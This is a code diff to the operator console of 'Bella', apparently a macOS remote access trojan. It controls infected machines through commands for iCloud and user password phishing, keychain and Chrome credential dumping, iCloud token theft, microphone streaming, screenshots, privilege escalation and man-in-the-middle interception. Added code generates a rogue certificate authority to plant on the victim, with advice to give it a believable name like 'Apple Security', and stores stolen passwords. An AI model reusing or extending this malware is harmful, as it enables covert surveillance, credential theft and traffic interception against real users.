@@ -2,13 +2,7 @@
 # -*- coding: utf-8 -*-
 import socket, os, sys, select, time, bz2, random, platform, datetime, base64, pickle
 import re, urllib, json, subprocess, errno, struct, optparse, ssl
-try:
-    import gnureadline
-    macOS_rl = False
-except ImportError:
-    import rlcompleter
-    import readline
-    macOS_rl = True
+import readline, rlcompleter
 
 violet = '\033[95m'
 blue = '\033[94m' #94 for original light blue
@@ -32,8 +26,7 @@ greenCheck = "%s[+] %s" % (green, endC)
 bluePlus = "%s[*] %s" % (blue, endC)
 yellow_star = "%s[*] %s" % (yellow, endC)
 
-commands = ['iCloud_query', 'bella_version', 'set_client_name', 'update_server', 'interactive_shell','upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
-<<<<<<< HEAD
+commands = ['iCloud_query', 'update_db_entry', 'volume', 'version', 'set_client_name', 'host_update', 'interactive_shell','upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
 
 def manual():
 	value = "\n%sBella Version%s\nReturn Bella's version / release number.\nUsage: %sbella_version%s\nRequirements: None\n" % (underline + bold + yellow, endANSI, bold, endANSI)
@@ -188,9 +181,9 @@ def main():
     ctrlC = False
     active=False
     first_run = True
-    cc_version = '1.10'
+    cc_version = '1.22'
     logpath = 'Logs/'
-    helperpath = ''
+    helperpath = os.getcwd() + '/'
     client_log_path = ''
     client_name = ''
     clients = []
@@ -384,7 +377,7 @@ def main():
                 elif data.startswith('cwdcwd'):
                     sdoof = data.splitlines()
                     workingdir = sdoof[0][6:]
-                    file_list = map(str.lower, sdoof[1:]) + sdoof[1:] + commands
+                    file_list = sdoof[1:] + commands
                     string_log(workingdir + '\n', client_log_path, client_name)
 
                 elif data.startswith('downloader'):
@@ -396,7 +389,7 @@ def main():
                             tell application \"Terminal\"\n\
                             do script \"mitmproxy -p 8081 --cadir %s\"\n\
                             end tell\n\
-                            EOF" % helperpath)
+                            EOF" % (helperpath + 'MITM'))
                     print 'MITM-ing. RUN mitm_kill AFTER YOU CLOSE MITMPROXY OR THE CLIENT\'S INTERNET WILL NOT WORK.'
 
                 elif data.startswith('keychain_download'):
@@ -419,7 +412,7 @@ def main():
                     else:
                         print "%sCouldn't find any iCloud accounts.\nEnter one manually to phish current GUI user [%s]" % (bluePlus, content[1])
                         appleID = ''
-                    username = raw_input("Enter iCloud Account: ") or appleID
+                    username = raw_input("Enter iCloud Account [press enter to use %s]: " % appleID) or appleID
                     if username == '':
                         print 'No username specified, cancelling Phish'
                         nextcmd = ''
@@ -515,22 +508,22 @@ def main():
                         workingdir = "~" + workingdir[pathlen:] #change working dir to ~[/users/name:restofpath] (in that range)
 
                     workingdirFormatted = blue + workingdir + endC
-                    if macOS_rl:
-                        if platform.system() == 'Linux':
-                            readline.parse_and_bind("tab: complete")
-                            readline.set_completer(tab_parser)
-                        else:
+                    if platform.system() == 'Linux':
+                        readline.parse_and_bind("tab: complete")
+                        readline.set_completer(tab_parser)
+                    else:
+                        if 'libedit' in readline.__doc__:
                             readline.parse_and_bind("bind ^I rl_complete")
                             readline.set_completer(tab_parser)
-                    else:
-                        gnureadline.parse_and_bind("tab: complete")
-                        gnureadline.set_completer(tab_parser)
+                        else:
+                            readline.parse_and_bind("tab: complete")
+                            readline.set_completer(tab_parser)
 
                     if nextcmd == "":
                         try:
                             nextcmd = raw_input("[%s]-[%s] " % (client_name_formatted, workingdirFormatted))
                             string_log("[%s]-[%s] %s" % (client_name, workingdirFormatted, nextcmd), client_log_path, client_name)
-                        except EOFError, e:
+                        except Exception, e:
                             nextcmd = "exit"
                     else:
                         pass
@@ -571,27 +564,41 @@ def main():
                         except ImportError:
                             print 'You need to install the python library "mitmproxy" to use this function.'
                             nextcmd = ''
-                        if not os.path.isfile("%smitm.crt" % helperpath):
+                        if not os.path.isdir('MITM'):
+                            os.mkdir('MITM')
+                        if not os.path.isfile("%sMITM/mitm.crt" % helperpath):
                             print "%sNo local Certificate Authority found.\nThis is necessary to decrypt TLS/SSL traffic.\nFollow the steps below to generate the certificates.%s\n\n" % (red, endC)
                             os.system("openssl genrsa -out mitm.key 2048")
                             print "%s\n\nYou can put any information here. Common Name is what will show up in the Keychain, so you may want to make this a believable name (IE 'Apple Security').%s\n\n" % (red, endC)
                             os.system("openssl req -new -x509 -key mitm.key -out mitm.crt")
                             os.system("cat mitm.key mitm.crt > mitmproxy-ca.pem")
                             os.remove("mitm.key")
+                            os.system("mv mitm.crt MITM/")
+                            os.system("mv mitmproxy-ca.pem MITM/mitmproxy-ca.pem")
                             #mitm.crt is the cert we will install on remote client.
                             #mitmproxy-ca.pem is for mitmproxy
                             print '%sGenerated all certs. Sending over to client.%s' % (green, endC)
-                        with open('%smitm.crt' % helperpath, 'r') as content:
+                        with open('%sMITM/mitm.crt' % helperpath, 'r') as content:
                             cert = content.read()
                         print 'Found the following certificate:'
-                        for x in subprocess.check_output("keytool -printcert -file %smitm.crt" % helperpath, shell=True).splitlines():
+                        for x in subprocess.check_output("keytool -printcert -file %sMITM/mitm.crt" % helperpath, shell=True).splitlines():
                             if 'Issuer: ' in x:
-                                print "%s%s%s" % (light_blue, x, endC)
+                                print "%s%s%s" % (lightBlue, x, endC)
+                        new_cert = raw_input("Would you like to generate a new certificate? (y/n): ")
+                        if new_cert.lower() == 'y':
+                            print "%sNo local Certificate Authority found.\nThis is necessary to decrypt TLS/SSL traffic.\nFollow the steps below to generate the certificates.%s\n\n" % (red, endC)
+                            os.system("openssl genrsa -out mitm.key 2048")
+                            print "%s\n\nYou can put any information here. Common Name is what will show up in the Keychain, so you may want to make this a believable name (IE 'Apple Security').%s\n\n" % (red, endC)
+                            os.system("openssl req -new -x509 -key mitm.key -out mitm.crt")
+                            os.system("cat mitm.key mitm.crt > mitmproxy-ca.pem")
+                            os.remove("mitm.key")
+                            os.system("mv mitm.crt MITM/")
+                            os.system("mv mitmproxy-ca.pem MITM/mitmproxy-ca.pem")
                         interface = raw_input("🚀  Specify an interface to MITM [Press enter for Wi-Fi]: ").replace("[", "").replace("]", "") or "Wi-Fi"
                         nextcmd = "mitm_start:::%s:::%s" % (interface, cert)
 
                     if nextcmd == ("mitm_kill"):
-                        for x in subprocess.check_output("keytool -printcert -file %smitm.crt" % helperpath, shell=True).splitlines():
+                        for x in subprocess.check_output("keytool -printcert -file %sMITM/mitm.crt" % helperpath, shell=True).splitlines():
                             if 'SHA1: ' in x:
                                 certsha = ''.join(x.split(':')[1:]).replace(' ', '')
                                 break
@@ -608,14 +615,44 @@ def main():
                     if nextcmd == "restart":
                         nextcmd = "osascript -e 'tell application \"System Events\" to restart'"
 
+                    if nextcmd == "update_db_entry":
+                        db_entries = ['iCloud Password', 'User Password']
+                        db_dict = ['applePass', 'localPass']
+                        for i, x in enumerate(db_entries):
+                            print "[%s%s%s] %s" % (red, i + 1, endC, x)
+                        while 1:
+                            try:
+                                entry = input('Which entry would you like to update or delete? Enter a number: ')
+                            except SyntaxError, EOFError:
+                                continue
+                            try:
+                                db_field = db_dict[entry - 1]
+                                if entry == 1: #iCloud Password
+                                    user = raw_input("Enter an iCloud username [just press enter to delete iCloud password]: ")
+                                    if not user:
+                                        passw = ''
+                                    else:
+                                        passw = raw_input("Enter an iCloud password: ")
+                                else:
+                                    user = raw_input("Enter a computer username [just press enter to delete user password]: ")
+                                    if not user:
+                                        passw = ''
+                                    else:
+                                        passw = raw_input("Enter a password for %s: " % user)
+                                db_value = "%s:%s" % (user, passw)
+                                nextcmd = 'update_db_entry:::%s:::%s' % (db_field, db_value)
+                                break
+                            except IndexError as e:
+                                print 'Please enter one the above numbers.'
+                                continue
+
                     if nextcmd.startswith("set_client_name"):
                         if nextcmd == "set_client_name":
                             nextcmd += ":::" + (raw_input("🐷  Please specify a client name: ") or computername)
                         else:
                             nextcmd = "set_client_name:::%s" % nextcmd.replace('set_client_name ', '')
-
-                    if nextcmd == "update_server":
-                        if nextcmd == "update_server": #no stdin
+                    if nextcmd == "host_update":
+                        if nextcmd == "host_update": #no stdin
                             local_file= raw_input("📡  Enter full path to new server on local machine: ")
                         else:
                             local_file = nextcmd[14:] #take path as stdin
@@ -623,7 +660,11 @@ def main():
                         if os.path.isfile(local_file):
                             with open(local_file, 'rb') as content:
                                 new_server = content.read()
-                            nextcmd = "update_server%s" % pickle.dumps(new_server)
+                            if not "verify_update_id = '2f4e2e37c9b6eecebb0927a96938b4fa'" in new_server:
+                                print 'This does not appear to be a Bella payload. Cancelling update.'
+                                nextcmd = ''
+                            else:
+                                nextcmd = "host_update%s" % pickle.dumps(new_server)
                         else:
                             print "Could not find [%s]!" % local_file
                             nextcmd = ''
@@ -697,6 +738,9 @@ def main():
 
                     if nextcmd == "sysinfo":
                         nextcmd = 'scutil --get LocalHostName; whoami; pwd; echo "----------"; sw_vers; ioreg -l | awk \'/IOPlatformSerialNumber/ { print "SerialNumber: \t" $4;}\'; echo "----------";sysctl -n machdep.cpu.brand_string; hostinfo | grep memory; df -h / | grep dev | awk \'{ printf $3}\'; printf "/"; df -h / | grep dev | awk \'{ printf $2 }\'; echo " HDD space used"; echo "----------"; printf "Local IP: "; ipconfig getifaddr en0; ipconfig getifaddr en1; printf "Current Window: "; python -c \'from AppKit import NSWorkspace; print NSWorkspace.sharedWorkspace().frontmostApplication().localizedName()\'; echo "----------"'
+
+                    if nextcmd == "version":
+                        nextcmd = "bella_version"
 
                     if nextcmd.startswith("upload"): #uploads to CWD.
                         if nextcmd == "upload":
